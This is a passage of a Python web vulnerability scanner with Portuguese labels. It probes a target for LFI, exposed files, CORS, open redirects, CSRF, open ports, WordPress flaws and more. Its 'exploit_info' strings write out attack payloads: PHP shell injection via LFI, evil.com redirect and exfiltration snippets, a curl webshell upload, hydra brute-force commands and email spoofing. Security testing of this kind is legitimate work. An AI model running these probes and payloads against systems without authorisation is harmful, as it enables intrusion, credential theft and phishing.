                    test_url = f"{url}?{param}={urllib.parse.quote(payload)}"
                    resp = self.session.get(test_url, timeout=10)
                    if indicator in resp.text.lower():
                        self.add_vuln(Vulnerability(
                            name="Directory Traversal / LFI",
                            severity="CRÍTICA",
                            description=f"LFI via parâmetro '{param}'",
                            evidence=f"URL: {test_url}\nIndicador: '{indicator}'",
                            exploit_info=f"Leitura de arquivos:\n"
                                         f"  ?{param}=../../../etc/passwd\n"
                                         f"  ?{param}=../../../etc/shadow\n"
                                         f"  ?{param}=../../../proc/self/environ\n\n"
                                         f"RCE via LFI:\n"
                                         f"  ?{param}=php://filter/convert.base64-encode/resource=index.php\n"
                                         f"  ?{param}=php://input  (POST: <?php system('id'); ?>)\n"
                                         f"  ?{param}=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+"
                                         + format_cve_info(lfi_cves),
                            remediation="1. Whitelist de arquivos permitidos\n"
                                        "2. realpath() + verificação de prefixo:\n"
                                        "   $real = realpath($file);\n"
                                        "   if(strpos($real, '/var/www/') !== 0) die();\n"
                                        "3. Remover ../ e %2e%2e do input\n"
                                        "4. Chroot/container\n"
                                        "5. open_basedir no php.ini",
                            category="Directory Traversal", cvss_score=9.1, cves=lfi_cves
                        ))
                        return
                except Exception:
                    continue
        self.log("  ✅ Nenhum LFI detectado")

    def scan_sensitive_files(self, url, domain):
        self.log("  Buscando arquivos sensíveis...")
        paths = [
            ('.env','CRÍTICA','Variáveis de ambiente com credenciais'),
            ('.git/config','CRÍTICA','Repositório Git exposto'),
            ('.git/HEAD','CRÍTICA','Repositório Git exposto'),
            ('.htaccess','ALTA','Config Apache'),
            ('.htpasswd','CRÍTICA','Senhas Apache'),
            ('wp-config.php','CRÍTICA','Config WordPress'),
            ('wp-login.php','INFO','Painel WordPress'),
            ('admin/','MÉDIA','Painel admin'),
            ('administrator/','MÉDIA','Painel admin'),
            ('phpmyadmin/','ALTA','phpMyAdmin'),
            ('phpinfo.php','ALTA','phpinfo()'),
            ('server-status','ALTA','Apache server-status'),
            ('web.config','ALTA','Config IIS'),
            ('backup.sql','CRÍTICA','Dump SQL'),
            ('backup.zip','CRÍTICA','Backup compactado'),
            ('dump.sql','CRÍTICA','Dump SQL'),
            ('config.php','ALTA','Config PHP'),
            ('config.json','ALTA','Config JSON'),
            ('config.yml','ALTA','Config YAML'),
            ('.DS_Store','MÉDIA','Estrutura macOS'),
            ('composer.json','BAIXA','Deps PHP'),
            ('package.json','BAIXA','Deps Node'),
            ('.svn/entries','ALTA','SVN exposto'),
            ('swagger/','MÉDIA','Swagger docs'),
            ('api-docs/','MÉDIA','API docs'),
            ('graphql','MÉDIA','Endpoint GraphQL'),
            ('debug/','ALTA','Modo debug'),
            ('console/','ALTA','Console web'),
            ('elmah.axd','ALTA','ELMAH logs'),
            ('logs/','ALTA','Dir de logs'),
            ('test/','MÉDIA','Dir de testes'),
        ]

        found = 0
        for path, sev, desc in paths:
            if self.stop_scan: return
            try:
                test_url = f"{url.rstrip('/')}/{path}"
                resp = self.session.get(test_url, timeout=6, allow_redirects=False)
                if resp.status_code == 200 and len(resp.text) > 50:
                    c = resp.text.lower()
                    if 'not found' not in c[:300] and '404' not in c[:200]:
                        found += 1
                        self.add_vuln(Vulnerability(
                            name=f"Arquivo Sensível: /{path}",
                            severity=sev, description=desc,
                            evidence=f"URL: {test_url}\nStatus: 200\nTamanho: {len(resp.text)}B",
                            exploit_info=f"Acessar: {test_url}\n"
                                         "Pode conter: credenciais, código, chaves, config",
                            remediation=f"Bloquear acesso:\n"
                                        f"  Apache: <Files \"{path}\">Require all denied</Files>\n"
                                        f"  Nginx: location /{path} {{ deny all; return 404; }}\n"
                                        f"Remover de produção",
                            category="Sensitive Files",
                            cvss_score=7.5 if sev in ['CRÍTICA','ALTA'] else 4.0
                        ))
            except Exception:
                continue
        self.log(f"  📁 {found} arquivos sensíveis encontrados")

    def scan_server_config(self, url, domain):
        try:
            resp = self.session.get(url, timeout=10)
            for ind in ['Index of /','Directory listing','<title>Index of']:
                if ind.lower() in resp.text.lower():
                    self.add_vuln(Vulnerability(
                        name="Directory Listing Habilitado",
                        severity="MÉDIA",
                        description="Servidor lista conteúdo dos diretórios",
                        evidence=f"Indicador: '{ind}'",
                        exploit_info="Navegar diretórios para achar:\n"
                                     "  backups, configs, código fonte, uploads",
                        remediation="Apache: Options -Indexes\nNginx: autoindex off;",
                        category="Server Config", cvss_score=5.3
                    ))
                    break

            # Teste de erro 404
            try:
                err = self.session.get(f"{url}/nonexistent_{int(time.time())}", timeout=8)
                etxt = err.text.lower()
                if any(x in etxt for x in ['stack trace','traceback','exception','debug','error in']):
                    self.add_vuln(Vulnerability(
                        name="Página de Erro Verbose",
                        severity="MÉDIA",
                        description="Erro 404 revela informações técnicas",
                        evidence=f"Status: {err.status_code}\nDetalhes técnicos expostos",
                        exploit_info="Stack traces revelam: paths, versões, configs internas",
                        remediation="Páginas de erro customizadas\nDesabilitar DEBUG em produção",
                        category="Server Config", cvss_score=5.0
                    ))
            except Exception:
                pass
        except Exception as e:
            self.log(f"  ❌ {str(e)}", "ERROR")

    def scan_cors(self, url, domain):
        cors_cves = CVE_DATABASE.get('cors', {}).get('cves', [])
        try:
            for origin in ['https://evil.com', 'null']:
                resp = self.session.get(url, headers={'Origin': origin}, timeout=10)
                acao = resp.headers.get('Access-Control-Allow-Origin', '')
                acac = resp.headers.get('Access-Control-Allow-Credentials', '')

                if acao == '*':
                    self.add_vuln(Vulnerability(
                        name="CORS Wildcard (*)",
                        severity="MÉDIA",
                        description="CORS permite qualquer origem",
                        evidence=f"Access-Control-Allow-Origin: *",
                        exploit_info="Qualquer site pode ler dados:\n"
                                     "  fetch('" + url + "/api/dados')\n"
                                     "  .then(r=>r.json()).then(d=>exfil(d))"
                                     + format_cve_info(cors_cves),
                        remediation="Whitelist de origens confiáveis\nNunca * com Credentials:true",
                        category="CORS", cvss_score=5.4, cves=cors_cves
                    ))
                    return
                elif acao == origin:
                    sev = 'ALTA' if acac.lower() == 'true' else 'MÉDIA'
                    self.add_vuln(Vulnerability(
                        name="CORS - Origem Refletida",
                        severity=sev,
                        description="Servidor reflete qualquer Origin",
                        evidence=f"Origin: {origin}\nACAO: {acao}\nCredentials: {acac}",
                        exploit_info="XHR com withCredentials=true rouba dados autenticados"
                                     + format_cve_info(cors_cves),
                        remediation="Validar Origin contra whitelist rigorosa",
                        category="CORS",
                        cvss_score=7.5 if acac.lower() == 'true' else 5.4,
                        cves=cors_cves
                    ))
                    return
            self.log("  ✅ CORS configurado corretamente")
        except Exception as e:
            self.log(f"  ❌ {str(e)}", "ERROR")

    def scan_open_redirect(self, url, domain):
        params = ['url','redirect','next','return','goto','link','target',
                  'dest','redirect_uri','callback','returnTo','continue']
        evil = 'https://evil.com'
        for param in params:
            if self.stop_scan: return
            try:
                resp = self.session.get(f"{url}?{param}={evil}", timeout=8, allow_redirects=False)
                if resp.status_code in [301,302,303,307,308]:
                    loc = resp.headers.get('Location', '')
                    if evil in loc:
                        self.add_vuln(Vulnerability(
                            name=f"Open Redirect ({param})",
                            severity="MÉDIA",
                            description=f"Redirect externo via '{param}'",
                            evidence=f"?{param}={evil}\nLocation: {loc}",
                            exploit_info=f"Phishing: {url}?{param}=https://evil.com/login\n"
                                         f"OAuth hijack: /oauth?redirect_uri=https://evil.com/steal",
                            remediation="1. Whitelist de destinos\n2. Paths relativos\n3. Confirmação ao usuário",
                            category="Open Redirect", cvss_score=6.1
                        ))
            except Exception:
                continue

    def scan_subdomains(self, url, domain):
        self.log("  Enumerando subdomínios...")
        subs = ['www','mail','ftp','admin','webmail','dev','staging','test',
                'api','app','blog','shop','portal','vpn','secure','cdn',
                'media','static','assets','docs','support','status','panel',
                'cpanel','phpmyadmin','jenkins','gitlab','git','jira',
                'demo','beta','intranet','internal','backup','old','new',
                'm','mobile','ws','wss','db','sql','redis','mongo']

        parts = domain.split('.')
        base = '.'.join(parts[-2:]) if len(parts) > 2 else domain

        found = []
        for sub in subs:
            if self.stop_scan: return
            try:
                sd = f"{sub}.{base}"
                ip = socket.gethostbyname(sd)
                found.append((sd, ip))
                self.log(f"  ✅ {sd:<30} → {ip}")
            except Exception:
                continue

        if found:
            self.add_vuln(Vulnerability(
                name=f"{len(found)} Subdomínios Descobertos",
                severity="INFO",
                description=f"Subdomínios ativos de {base}",
                evidence='\n'.join([f"  {s} → {ip}" for s, ip in found]),
                exploit_info="Alvos para scan individual:\n" +
                             '\n'.join([f"  python3 vulnscan_pro.py → {s}" for s, _ in found[:5]]) +
                             "\n\nFerramentas avançadas:\n"
                             "  subfinder -d " + base + "\n"
                             "  amass enum -d " + base + "\n"
                             "  assetfinder " + base,
                remediation="1. Remover subdomínios não usados\n"
                            "2. Proteger dev/staging com auth\n"
                            "3. Monitorar subdomain takeover",
                category="Reconnaissance", cvss_score=2.0
            ))

    def scan_common_ports(self, url, domain):
        self.log("  Scan de portas...")
        ports = {21:'FTP',22:'SSH',23:'Telnet',25:'SMTP',53:'DNS',80:'HTTP',
                 110:'POP3',143:'IMAP',443:'HTTPS',445:'SMB',1433:'MSSQL',
                 3306:'MySQL',3389:'RDP',5432:'PostgreSQL',5900:'VNC',
                 6379:'Redis',8080:'HTTP-Alt',8443:'HTTPS-Alt',
                 9200:'Elasticsearch',27017:'MongoDB',11211:'Memcached'}
        dangerous = {21,23,445,1433,3306,3389,5432,5900,6379,9200,27017,11211}

        try:
            ip = socket.gethostbyname(domain)
        except Exception:
            return

        for port, service in ports.items():
            if self.stop_scan: return
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(1.5)
                if sock.connect_ex((ip, port)) == 0:
                    self.log(f"  🔓 {port}/{service} ABERTA")
                    if port in dangerous:
                        self.add_vuln(Vulnerability(
                            name=f"Porta Sensível: {port} ({service})",
                            severity="ALTA",
                            description=f"{service} acessível externamente",
                            evidence=f"IP: {ip}\nPorta: {port}/{service}",
                            exploit_info=f"Reconhecimento:\n"
                                         f"  nmap -sV -sC -p {port} {ip}\n\n"
                                         f"Brute Force:\n"
                                         f"  hydra -l admin -P wordlist.txt {ip} {service.lower()}\n"
                                         f"  medusa -h {ip} -u admin -P wordlist.txt -M {service.lower()}\n\n"
                                         f"Metasploit:\n"
                                         f"  msfconsole -q -x 'search {service.lower()}'",
                            remediation="1. Fechar se não necessária\n"
                                        "2. Firewall: ufw deny {port}\n"
                                        "3. iptables -A INPUT -p tcp --dport {port} -j DROP\n"
                                        "4. Usar VPN para acesso\n"
                                        "5. fail2ban para proteção",
                            category="Network", cvss_score=7.5
                        ))
                sock.close()
            except Exception:
                continue

    def scan_robots_sitemap(self, url, domain):
        try:
            resp = self.session.get(f"{url.rstrip('/')}/robots.txt", timeout=8)
            if resp.status_code == 200 and len(resp.text) > 10:
                self.log(f"  ✅ robots.txt ({len(resp.text)}B)")
                paths = re.findall(r'Disallow:\s*(.+)', resp.text)
                sensitive = [p.strip() for p in paths if any(
                    s in p.lower() for s in ['admin','secret','private','backup',
                                             'config','api','panel','internal','upload'])]
                if sensitive:
                    self.add_vuln(Vulnerability(
                        name="Robots.txt Revela Paths Sensíveis",
                        severity="BAIXA",
                        description=f"{len(sensitive)} caminhos sensíveis no robots.txt",
                        evidence='\n'.join([f"  Disallow: {p}" for p in sensitive]),
                        exploit_info="Acessar cada caminho:\n" +
                                     '\n'.join([f"  {url.rstrip('/')}{p}" for p in sensitive[:8]]),
                        remediation="robots.txt não é segurança!\n"
                                    "Proteger diretórios com autenticação real",
                        category="Info Disclosure", cvss_score=3.7
                    ))
        except Exception as e:
            self.log(f"  ❌ {str(e)}", "ERROR")

    def scan_forms(self, url, domain):
        try:
            resp = self.session.get(url, timeout=10)
            soup = BeautifulSoup(resp.text, 'html.parser')
            forms = soup.find_all('form')
            self.log(f"  📝 {len(forms)} formulários")

            for i, form in enumerate(forms):
                inputs = form.find_all(['input','textarea','select'])
                pwds = [x for x in inputs if x.get('type','').lower() == 'password']

                if pwds and url.startswith('http://'):
                    self.add_vuln(Vulnerability(
                        name="Login sem HTTPS",
                        severity="CRÍTICA",
                        description="Formulário com senha via HTTP",
                        evidence=f"Formulário #{i+1}",
                        exploit_info="Credenciais em texto puro!\n"
                                     "Wireshark: http.request.method==POST",
                        remediation="HTTPS obrigatório",
                        category="Authentication", cvss_score=9.0
                    ))

                for pwd in pwds:
                    if pwd.get('autocomplete','').lower() != 'off':
                        self.add_vuln(Vulnerability(
                            name="Autocomplete em Senha",
                            severity="BAIXA",
                            description="Navegador pode salvar senha",
                            evidence=f"Formulário #{i+1}",
                            exploit_info="Malware/acesso físico pode ler senhas salvas",
                            remediation="autocomplete='new-password'",
                            category="Authentication", cvss_score=3.3
                        ))
                        break
        except Exception as e:
            self.log(f"  ❌ {str(e)}", "ERROR")

    def scan_technologies(self, url, domain):
        try:
            resp = self.session.get(url, timeout=10)
            content = resp.text.lower()
            hdrs = ' '.join([f"{k}:{v}" for k,v in resp.headers.items()]).lower()
            full = content + ' ' + hdrs

            sigs = {
                'WordPress': ['/wp-content/','/wp-includes/','wp-json'],
                'Joomla': ['/components/','joomla!'],
                'Drupal': ['/sites/default/','drupal'],
                'Laravel': ['laravel_session'],
                'Django': ['csrfmiddlewaretoken'],
                'React': ['react-dom','_reactroot','__react'],
                'Angular': ['ng-version','angular'],
                'Vue.js': ['v-bind','v-model','vue.js'],
                'jQuery': ['jquery'],
                'Bootstrap': ['bootstrap'],
                'PHP': ['phpsessid','.php'],
                'ASP.NET': ['__viewstate','asp.net'],
                'Node.js/Express': ['x-powered-by: express'],
                'Cloudflare': ['cf-ray','cloudflare'],
                'Nginx': ['nginx'],
                'Apache': ['apache'],
            }

            detected = []
            for tech, s in sigs.items():
                if any(x in full for x in s):
                    detected.append(tech)

            self.technologies = detected
            if detected:
                self.log(f"  🔧 Stack: {', '.join(detected)}")

                # Buscar CVEs para cada tecnologia
                all_cves = []
                cve_per_tech = {}
                for tech in detected:
                    cves = get_cves_for_tech(tech)
                    if cves:
                        cve_per_tech[tech] = cves
                        all_cves.extend(cves)

                cve_info = ""
                for tech, cves in cve_per_tech.items():
                    cve_info += f"\n  [{tech}]:"
                    for c in cves[:3]:
                        cve_info += f"\n    {c['id']} ({c['score']}) - {c['description'][:60]}"
                        cve_info += f"\n    🔗 {c['url']}"

                self.add_vuln(Vulnerability(
                    name=f"Tecnologias Detectadas ({len(detected)})",
                    severity="INFO",
                    description=f"Stack: {', '.join(detected)}",
                    evidence=', '.join(detected),
                    exploit_info="Buscar CVE por tecnologia:\n" +
                                 '\n'.join([f"  searchsploit {t.lower()}" for t in detected[:5]]) +
                                 "\n\nCVE conhecidas:" + cve_info if cve_info else "",
                    remediation="Manter todas atualizadas\nMonitorar CVE: https://nvd.nist.gov",
                    category="Reconnaissance", cvss_score=0.0, cves=all_cves[:5]
                ))

                if 'WordPress' in detected:
                    self._check_wp(url, domain)
        except Exception as e:
            self.log(f"  ❌ {str(e)}", "ERROR")

    def _check_wp(self, url, domain):
        wp_cves = CVE_DATABASE.get('wordpress', {}).get('cves', [])
        try:
            resp = self.session.get(url, timeout=10)
            vm = re.search(r'content="WordPress\s+([\d.]+)"', resp.text)
            if vm:
                v = vm.group(1)
                self.add_vuln(Vulnerability(
                    name=f"WordPress {v} Detectado",
                    severity="BAIXA",
                    description=f"WordPress {v} com versão exposta",
                    evidence=f"Meta tag: WordPress {v}",
                    exploit_info=f"wpscan --url {url} --enumerate vp,vt,u\n"
                                 f"searchsploit wordpress {v}"
                                 + format_cve_info(wp_cves),
                    remediation="Remover meta tag:\nadd_filter('the_generator','__return_empty_string');\nAtualizar WordPress",
                    category="WordPress", cvss_score=3.7, cves=wp_cves
                ))
        except Exception:
            pass

        xmlrpc_cves = CVE_DATABASE.get('xmlrpc', {}).get('cves', [])
        try:
            r = self.session.post(f"{url.rstrip('/')}/xmlrpc.php", timeout=8,
                                   data='<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName></methodCall>')
            if r.status_code == 200 and 'methodResponse' in r.text:
                self.add_vuln(Vulnerability(
                    name="WordPress XML-RPC Ativo",
                    severity="MÉDIA",
                    description="XML-RPC ativo - brute force amplificado + DDoS",
                    evidence=f"URL: {url}/xmlrpc.php (200 OK)",
                    exploit_info="system.multicall: 1000+ senhas/request\n"
                                 "Pingback DDoS amplification"
                                 + format_cve_info(xmlrpc_cves),
                    remediation="<Files xmlrpc.php>\n  Deny from all\n</Files>",
                    category="WordPress", cvss_score=5.3, cves=xmlrpc_cves
                ))
        except Exception:
            pass

        try:
            r = self.session.get(f"{url}?author=1", timeout=8, allow_redirects=True)
            if '/author/' in r.url:
                user = r.url.split('/author/')[-1].strip('/')
                self.add_vuln(Vulnerability(
                    name=f"WP User Enum: {user}",
                    severity="MÉDIA",
                    description=f"Enumeração de usuário: {user}",
                    evidence=f"?author=1 → {r.url}",
                    exploit_info=f"Brute force:\n  wpscan --url {url} -U {user} -P rockyou.txt",
                    remediation="Plugin anti-enumeration\nBloquear ?author= no .htaccess",
                    category="WordPress", cvss_score=5.0
                ))
        except Exception:
            pass

    def scan_clickjacking(self, url, domain):
        cj_cves = CVE_DATABASE.get('clickjacking', {}).get('cves', [])
        try:
            resp = self.session.get(url, timeout=10)
            xfo = resp.headers.get('X-Frame-Options', '')
            csp = resp.headers.get('Content-Security-Policy', '')
            if not xfo and 'frame-ancestors' not in csp:
                self.add_vuln(Vulnerability(
                    name="Vulnerável a Clickjacking",
                    severity="MÉDIA",
                    description="Sem proteção contra iframe embedding",
                    evidence="Sem X-Frame-Options e sem frame-ancestors CSP",
                    exploit_info="Ataque:\n"
                                 f'<iframe src="{url}" style="opacity:0.01;position:absolute;width:100%;height:100%"></iframe>\n'
                                 '<button style="position:relative;z-index:-1;font-size:30px;margin:200px">CLIQUE PARA GANHAR!</button>'
                                 + format_cve_info(cj_cves),
                    remediation="X-Frame-Options: DENY\nCSP: frame-ancestors 'self'\n"
                                "JS fallback: if(top!==self)top.location=self.location",
                    category="Clickjacking", cvss_score=4.7, cves=cj_cves
                ))
        except Exception as e:
            self.log(f"  ❌ {str(e)}", "ERROR")

    def scan_info_disclosure(self, url, domain):
        try:
            resp = self.session.get(url, timeout=10)
            patterns = {
                'IP Interno': (r'(?:10\.\d+\.\d+\.\d+|192\.168\.\d+\.\d+|172\.(?:1[6-9]|2\d|3[01])\.\d+\.\d+)', 'MÉDIA'),
                'AWS Key': (r'AKIA[0-9A-Z]{16}', 'CRÍTICA'),
                'API Key': (r'(?:api[_-]?key|apikey|api_secret)["\s:=]+["\']?([a-zA-Z0-9_\-]{20,})', 'ALTA'),
                'Token/Secret': (r'(?:secret|token|password|passwd)["\s:=]+["\']?([^\s"\']{8,})', 'ALTA'),
                'Comentário Sensível': (r'<!--[\s\S]*?(?:password|admin|todo|fixme|debug|hack|temp)[\s\S]*?-->', 'MÉDIA'),
                'Path do Servidor': (r'(?:/home/\w+|/var/www|C:\\\\[\w]+|/opt/\w+)', 'MÉDIA'),
            }
            for name, (pat, sev) in patterns.items():
                matches = re.findall(pat, resp.text, re.IGNORECASE)
                if matches:
                    unique = list(set(matches))[:3]
                    self.add_vuln(Vulnerability(
                        name=f"Info Disclosure: {name}",
                        severity=sev,
                        description=f"{name} encontrado no HTML",
                        evidence=f"Exemplos: {', '.join(str(m)[:60] for m in unique)}",
                        exploit_info="Dados internos expostos podem ser usados para:\n"
                                     "  - Pivot/lateral movement\n  - Acesso a APIs\n  - Engenharia social",
                        remediation="Remover dados sensíveis do HTML\n"
                                    "Usar variáveis de ambiente\nRemover comentários em produção",
                        category="Info Disclosure",
                        cvss_score=7.0 if sev == 'CRÍTICA' else 5.0 if sev == 'ALTA' else 3.0
                    ))
        except Exception as e:
            self.log(f"  ❌ {str(e)}", "ERROR")

    def scan_email_harvest(self, url, domain):
        try:
            emails = set()
            for path in ['', '/contact', '/about', '/contato', '/sobre', '/team']:
                try:
                    r = self.session.get(f"{url.rstrip('/')}{path}", timeout=6)
                    emails.update(re.findall(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', r.text))
                except Exception:
                    pass
            if emails:
                self.log(f"  📧 {len(emails)} emails")
                self.add_vuln(Vulnerability(
                    name=f"Emails Expostos ({len(emails)})",
                    severity="BAIXA",
                    description=f"{len(emails)} emails encontrados",
                    evidence='\n'.join([f"  {e}" for e in sorted(emails)][:15]),
                    exploit_info="1. Phishing direcionado (spear phishing)\n"
                                 "2. Verificar breaches: haveibeenpwned.com\n"
                                 "3. Brute force em painéis de login\n"
                                 "4. Engenharia social",
                    remediation="Formulário de contato em vez de email direto\nOfuscar com JS",
                    category="Info Disclosure", cvss_score=3.0
                ))
        except Exception as e:
            self.log(f"  ❌ {str(e)}", "ERROR")

    def scan_waf_detection(self, url, domain):
        try:
            resp = self.session.get(f"{url}?id=1'+OR+1=1--", timeout=10)
            sigs = {
                'Cloudflare':['cloudflare','cf-ray','cf-cache'],
                'AWS WAF':['awswaf','x-amzn'],
                'Akamai':['akamai','x-akamai'],
                'Sucuri':['sucuri','x-sucuri'],
                'ModSecurity':['mod_security','modsecurity'],
                'Imperva':['incapsula','imperva'],
                'F5 BIG-IP':['big-ip','f5'],
                'Barracuda':['barracuda'],
                'Fortinet':['fortiweb','fortigate'],
            }
            hdrs = ' '.join([f"{k}:{v}" for k,v in resp.headers.items()]).lower()
            body = resp.text.lower()[:2000]
            detected = None

            for waf, s in sigs.items():
                if any(x in hdrs or x in body for x in s):
                    detected = waf
                    break
            if not detected and resp.status_code in [403,406,503]:
                detected = "WAF Genérico"

            if detected:
                self.log(f"  🛡️ WAF: {detected}")
                self.add_vuln(Vulnerability(
                    name=f"WAF Detectado: {detected}",
                    severity="INFO",
                    description=f"Web Application Firewall: {detected}",
                    evidence=f"WAF: {detected}",
                    exploit_info=f"Bypass techniques:\n"
                                 f"  - Double URL encoding\n"
                                 f"  - Unicode normalization\n"
                                 f"  - HTTP Parameter Pollution\n"
                                 f"  - Fragmentação de payloads\n"
                                 f"  wafw00f {url}",
                    remediation="Manter WAF atualizado\nModo blocking\nVirtual patching",
                    category="WAF", cvss_score=0.0
                ))
            else:
                self.add_vuln(Vulnerability(
                    name="Sem WAF Detectado",
                    severity="MÉDIA",
                    description="Nenhum WAF protegendo o site",
                    evidence="Sem assinatura de WAF",
                    exploit_info="Ataques não filtrados diretamente",
                    remediation="Implementar WAF:\n"
                                "  Cloudflare (gratuito)\n  ModSecurity (open source)\n  AWS WAF",
                    category="WAF", cvss_score=5.0
                ))
        except Exception as e:
            self.log(f"  ❌ {str(e)}", "ERROR")

    def scan_vulnerable_components(self, url, domain):
        self.log("  Verificando componentes + CVE...")
        try:
            resp = self.session.get(url, timeout=10)
            content = resp.text

            # jQuery
            jqs = re.findall(r'jquery[/.-]?v?([\d]+\.[\d]+\.[\d]+)', content.lower())
            for v in set(jqs):
                try:
                    major, minor, _ = [int(x) for x in v.split('.')]
                    if major < 3 or (major == 3 and minor < 5):
                        jquery_cves = CVE_DATABASE.get('jquery', {}).get('cves', [])
                        self.add_vuln(Vulnerability(
                            name=f"jQuery Vulnerável: {v}",
                            severity="MÉDIA",
                            description=f"jQuery {v} tem CVE conhecidas",
                            evidence=f"jQuery versão {v} no código fonte",
                            exploit_info=f"Versão: {v}\nVulnerável a XSS via .html()/.append()\n"
                                         + format_cve_info(jquery_cves),
                            remediation="Atualizar para jQuery 3.7+:\n"
                                        "<script src='https://code.jquery.com/jquery-3.7.1.min.js'></script>",
                            category="Vulnerable Components", cvss_score=6.1, cves=jquery_cves
                        ))
                except Exception:
                    continue

            # Bootstrap
            bsv = re.findall(r'bootstrap[/.-]?v?([\d]+\.[\d]+\.[\d]+)', content.lower())
            for v in set(bsv):
                try:
                    major = int(v.split('.')[0])
                    if major < 4:
                        bs_cves = CVE_DATABASE.get('bootstrap', {}).get('cves', [])
                        self.add_vuln(Vulnerability(
                            name=f"Bootstrap Vulnerável: {v}",
                            severity="MÉDIA",
                            description=f"Bootstrap {v} tem XSS conhecidos",
                            evidence=f"Bootstrap {v}",
                            exploit_info="XSS via tooltip/popover data-template"
                                         + format_cve_info(bs_cves),
                            remediation="Atualizar para Bootstrap 5.x",
                            category="Vulnerable Components", cvss_score=6.1, cves=bs_cves
                        ))
                except Exception:
                    continue

            # Angular.js (EOL)
            if 'angularjs' in content.lower() or 'angular.min.js/1.' in content.lower():
                self.add_vuln(Vulnerability(
                    name="AngularJS (EOL) Detectado",
                    severity="MÉDIA",
                    description="AngularJS 1.x está end-of-life desde Dez 2021",
                    evidence="AngularJS no código fonte",
                    exploit_info="Sandbox bypass para XSS:\n"
                                 "  {{constructor.constructor('alert(1)')()}}\n\n"
                                 "CVE-2022-25869 (CVSS 6.1)\n"
                                 "🔗 https://nvd.nist.gov/vuln/detail/CVE-2022-25869",
                    remediation="Migrar para Angular 17+ (complete rewrite)",
                    category="Vulnerable Components", cvss_score=6.1
                ))

        except Exception as e:
            self.log(f"  ❌ {str(e)}", "ERROR")

    def scan_dns(self, url, domain):
        try:
            has_spf = has_dmarc = False
            try:
                for r in dns.resolver.resolve(domain, 'TXT'):
                    if 'v=spf1' in str(r): has_spf = True
            except Exception: pass
            try:
                for r in dns.resolver.resolve(f'_dmarc.{domain}', 'TXT'):
                    if 'v=DMARC1' in str(r): has_dmarc = True
            except Exception: pass

            if not has_spf:
                self.add_vuln(Vulnerability(
                    name="SPF Não Configurado",
                    severity="MÉDIA", description="Email spoofing possível",
                    evidence=f"Sem TXT v=spf1 em {domain}",
                    exploit_info=f"Spoofing:\n  swaks --to victim@x.com --from admin@{domain}\n"
                                 f"  sendemail -f admin@{domain} -t victim@x.com -s mx.{domain}",
                    remediation=f'DNS TXT: {domain}. "v=spf1 include:_spf.google.com ~all"',
                    category="DNS/Email", cvss_score=5.0
                ))
            else:
                self.log("  ✅ SPF configurado")

            if not has_dmarc:
                self.add_vuln(Vulnerability(
                    name="DMARC Não Configurado",
                    severity="MÉDIA", description="Emails falsos não bloqueados",
                    evidence=f"Sem _dmarc.{domain}",
                    exploit_info="Spoofing não filtrado pelos receptores",
                    remediation=f'DNS TXT: _dmarc.{domain}. "v=DMARC1; p=quarantine; rua=mailto:dmarc@{domain}"',
                    category="DNS/Email", cvss_score=5.0
                ))
            else:
                self.log("  ✅ DMARC configurado")
        except Exception as e:
            self.log(f"  ❌ {str(e)}", "ERROR")

    def scan_http_methods(self, url, domain):
        try:
            resp = self.session.options(url, timeout=8)
            allow = resp.headers.get('Allow', '')
            if allow:
                self.log(f"  Métodos: {allow}")
                for m in ['PUT','DELETE','TRACE','CONNECT']:
                    if m in allow.upper():
                        self.add_vuln(Vulnerability(
                            name=f"HTTP {m} Habilitado",
                            severity="MÉDIA",
                            description=f"Método {m} ativo",
                            evidence=f"Allow: {allow}",
                            exploit_info=f"PUT → upload webshell:\n  curl -X PUT -d @shell.php {url}/shell.php\n"
                                         f"DELETE → remover arquivos:\n  curl -X DELETE {url}/important\n"
                                         f"TRACE → XST (Cross-Site Tracing)",
                            remediation="Apache: <LimitExcept GET POST>Require all denied</LimitExcept>\n"
                                        "Nginx: if($request_method !~ ^(GET|POST)$) {{ return 444; }}",
                            category="Server Config", cvss_score=5.3
                        ))
        except Exception as e:
            self.log(f"  ❌ {str(e)}", "ERROR")

    def scan_csrf(self, url, domain):
        csrf_cves = CVE_DATABASE.get('csrf', {}).get('cves', [])
        try:
            resp = self.session.get(url, timeout=10)
            soup = BeautifulSoup(resp.text, 'html.parser')
            forms = soup.find_all('form', method=re.compile('post', re.IGNORECASE))
            tokens = ['csrf','token','_token','csrfmiddlewaretoken','authenticity_token','__requestverificationtoken','xsrf']

            for form in forms:
                has = False
                for inp in form.find_all('input', type='hidden'):
                    if any(t in (inp.get('name','') or '').lower() for t in tokens):
                        has = True
                        break
                if not has:
                    action = form.get('action', '/')
                    self.add_vuln(Vulnerability(
                        name="Sem Proteção CSRF",
                        severity="MÉDIA",
                        description=f"Formulário POST sem token CSRF",
                        evidence=f"Form action: {action}",
                        exploit_info="Ataque CSRF:\n"
                                     "<html><body onload='document.forms[0].submit()'>\n"
                                     f"<form action='{urllib.parse.urljoin(url,action)}' method='POST'>\n"
                                     "  <input name='email' value='hacker@evil.com'>\n"
                                     "</form></body></html>"
                                     + format_cve_info(csrf_cves),
                        remediation="1. Tokens CSRF em cada formulário POST\n"
                                    "2. SameSite=Strict nos cookies\n"
                                    "3. Verificar Referer/Origin no servidor\n"
                                    "4. Django: {% csrf_token %}\n"
                                    "5. Laravel: @csrf\n"
                                    "6. Express: csurf middleware",
                        category="CSRF", cvss_score=6.5, cves=csrf_cves
                    ))
                    return
        except Exception as e:
            self.log(f"  ❌ {str(e)}", "ERROR")

    def scan_security_txt(self, url, domain):
        try:
            for path in ['/.well-known/security.txt', '/security.txt']:
                resp = self.session.get(f"{url.rstrip('/')}{path}", timeout=6)
                if resp.status_code == 200 and 'contact' in resp.text.lower():
                    self.log(f"  ✅ security.txt encontrado")
                    return
            self.add_vuln(Vulnerability(
                name="Sem security.txt",
                severity="INFO",
                description="Sem canal de contato para report de vulns",
                evidence="Não encontrado em /.well-known/security.txt",
                exploit_info="Pesquisadores não sabem como reportar vulnerabilidades",
                remediation=f"Criar /.well-known/security.txt:\n"
                            f"  Contact: mailto:security@{domain}\n"
                            f"  Expires: 2026-01-01T00:00:00.000Z\n"
                            f"  Preferred-Languages: pt, en",
                category="Best Practices", cvss_score=0.0
            ))
        except Exception as e:
            self.log(f"  ❌ {str(e)}", "ERROR")


# ==================== GERADOR HTML ====================

class HTMLReportGenerator:
    @staticmethod
    def generate(scan_info, vulnerabilities, filename):
        sc = defaultdict(int)
